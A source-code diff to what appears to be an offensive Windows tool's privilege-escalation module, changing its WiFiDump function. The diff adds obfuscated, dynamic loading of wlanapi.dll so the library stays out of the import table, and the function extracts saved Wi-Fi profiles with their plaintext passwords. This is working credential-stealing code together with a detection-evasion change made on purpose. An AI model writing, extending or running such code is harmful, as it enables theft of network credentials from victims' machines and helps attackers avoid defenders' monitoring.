@@ -1,5 +1,29 @@
 #include "PrivEsc.h"
+#include "Obf.h"
 #include <wlanapi.h>
+
+// Dynamic wlanapi loading — keeps wlanapi.dll out of import table
+typedef DWORD (WINAPI* pfnWlanOpenHandle)(DWORD,PVOID,PDWORD,PHANDLE);
+typedef DWORD (WINAPI* pfnWlanEnumInterfaces)(HANDLE,PVOID,PWLAN_INTERFACE_INFO_LIST**);
+typedef DWORD (WINAPI* pfnWlanGetProfileList)(HANDLE,const GUID*,PVOID,PWLAN_PROFILE_INFO_LIST**);
+typedef DWORD (WINAPI* pfnWlanGetProfile)(HANDLE,const GUID*,LPCWSTR,PVOID,PWSTR*,PDWORD,PDWORD);
+typedef VOID  (WINAPI* pfnWlanFreeMemory)(PVOID);
+typedef DWORD (WINAPI* pfnWlanCloseHandle)(HANDLE,PVOID);
+static struct { pfnWlanOpenHandle Open; pfnWlanEnumInterfaces Enum;
+                pfnWlanGetProfileList GetList; pfnWlanGetProfile GetProfile;
+                pfnWlanFreeMemory Free; pfnWlanCloseHandle Close; } gWlan = {};
+static bool LoadWlanApi() {
+    if (gWlan.Open) return true;
+    HMODULE h = LoadLibraryA(S("wlanapi.dll").c_str());
+    if (!h) return false;
+    gWlan.Open       = (pfnWlanOpenHandle)     GetProcAddress(h, S("WlanOpenHandle").c_str());
+    gWlan.Enum       = (pfnWlanEnumInterfaces) GetProcAddress(h, S("WlanEnumInterfaces").c_str());
+    gWlan.GetList    = (pfnWlanGetProfileList) GetProcAddress(h, S("WlanGetProfileList").c_str());
+    gWlan.GetProfile = (pfnWlanGetProfile)     GetProcAddress(h, S("WlanGetProfile").c_str());
+    gWlan.Free       = (pfnWlanFreeMemory)     GetProcAddress(h, S("WlanFreeMemory").c_str());
+    gWlan.Close      = (pfnWlanCloseHandle)    GetProcAddress(h, S("WlanCloseHandle").c_str());
+    return gWlan.Open != nullptr;
+}
 
 // ── Shared: write a registry string value ─────────────────────────────────────
 static bool RegSetStr(HKEY hRoot, const char* subkey, const char* name, const char* val) {
@@ -161,13 +185,13 @@ std::string PrivEsc::WiFiDump() {
 
     // Detection: WlanOpenHandle + WlanGetProfile(WLAN_PROFILE_GET_PLAINTEXT_KEY)
     // from a non-service process is logged by Sysmon and Windows security events.
-    if (WlanOpenHandle(2, NULL, &dwVer, &hWlan) != ERROR_SUCCESS) {
+    if (!LoadWlanApi() || gWlan.Open(2, NULL, &dwVer, &hWlan) != ERROR_SUCCESS) {
         return "wifi: WlanOpenHandle failed (need admin)";
     }
 
     PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
-    if (WlanEnumInterfaces(hWlan, NULL, &pIfList) != ERROR_SUCCESS) {
-        WlanCloseHandle(hWlan, NULL);
+    if (gWlan.Enum(hWlan, NULL, &pIfList) != ERROR_SUCCESS) {
+        gWlan.Close(hWlan, NULL);
         return "wifi: WlanEnumInterfaces failed";
     }
 
@@ -176,7 +200,7 @@ std::string PrivEsc::WiFiDump() {
         PWLAN_INTERFACE_INFO pIface = &pIfList->InterfaceInfo[i];
 
         PWLAN_PROFILE_INFO_LIST pProfileList = NULL;
-        if (WlanGetProfileList(hWlan, &pIface->InterfaceGuid, NULL, &pProfileList)
+        if (gWlan.GetList(hWlan, &pIface->InterfaceGuid, NULL, &pProfileList)
             != ERROR_SUCCESS) continue;
 
         for (DWORD j = 0; j < pProfileList->dwNumberOfItems; ++j) {
@@ -185,22 +209,22 @@ std::string PrivEsc::WiFiDump() {
             DWORD dwFlags = WLAN_PROFILE_GET_PLAINTEXT_KEY;
             DWORD dwGranted = 0;
 
-            DWORD ret = WlanGetProfile(hWlan, &pIface->InterfaceGuid,
-                                       ssid, NULL, &pProfileXml, &dwFlags, &dwGranted);
+            DWORD ret = gWlan.GetProfile(hWlan, &pIface->InterfaceGuid,
+                                         ssid, NULL, &pProfileXml, &dwFlags, &dwGranted);
             if (ret == ERROR_SUCCESS && pProfileXml) {
                 std::string key = ExtractKeyMaterial(std::wstring(pProfileXml));
                 result += "SSID: " + WstrToStr(ssid) + "  Password: " + key + "\n";
-                WlanFreeMemory(pProfileXml);
+                gWlan.Free(pProfileXml);
             } else {
                 result += "SSID: " + WstrToStr(ssid) + "  Password: (access denied err=" +
                           std::to_string(ret) + ")\n";
             }
         }
-        WlanFreeMemory(pProfileList);
+        gWlan.Free(pProfileList);
     }
 
-    WlanFreeMemory(pIfList);
-    WlanCloseHandle(hWlan, NULL);
+    gWlan.Free(pIfList);
+    gWlan.Close(hWlan, NULL);
 
     return result.empty() ? "wifi: no saved profiles found" : result;
 }
